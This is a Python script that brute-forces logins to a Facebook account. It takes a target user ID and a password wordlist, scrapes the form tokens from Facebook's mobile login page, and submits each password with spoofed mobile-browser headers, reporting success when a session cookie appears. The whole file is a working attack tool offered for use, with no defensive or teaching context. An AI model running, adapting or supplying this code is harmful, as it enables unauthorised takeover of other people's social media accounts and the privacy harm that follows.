import requests,os,re,sys,time
os.system('clear')
#==========================#
BL="\033[1;30m" # Black
RR="\033[1;31m" # Red
GR="\033[1;32m" # Green
YY="\033[1;33m" # Yellow
BB="\033[1;34m" # Blue
PP="\033[1;35m" # Purple
CC="\033[1;36m" # Cyan
W="\033[1;37m"# White
#==========================#
# Create a session
session = requests.Session()
loop = 0

def main():
	print(40*f'{W}=')
	uid = input(f"{W}[{GR}+{W}] ENTER YOUR TERGET  UID:{GR} ").strip()
	print(40*f'{W}=') 
	print(f'{W}[{GR}+{W}] Example : {GR}/sdcard/password.txt{W}')
	password_file = input(f"{W}[{GR}+{W}] PASSWORD FILE PATH :{GR} ").strip()
	passwords = load_passwords(password_file)
	mains(uid, passwords)
	
  
def load_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        sys.exit(1)

def mains(uid, passwords):
    global loop
    for password in passwords:
        print(40*f"=")
        sys.stdout.write(f"\r{W}[{GR}M1{W}] ~ [Trying password: {GR}{loop}{W}:{password}\r "), sys.stdout.flush()
        p = session.get(f'https://m.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&refsrc=deprecated&_rdr')
        dataa = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'uid': uid,
            'next': 'https://m.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': password
        }
        headers = {
            'Host': 'm.facebook.com',
            'viewport-width': '980',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-prefers-color-scheme': 'light',
            'dnt': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9'
        }
        po = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False, headers=headers)
        cookies = session.cookies.get_dict().keys()
        if "c_user" in cookies:
            print(f'{W}[{GR}+{W}] Success: {uid} | {password}')
            return
        loop += 1

if __name__ == "__main__":
    main()
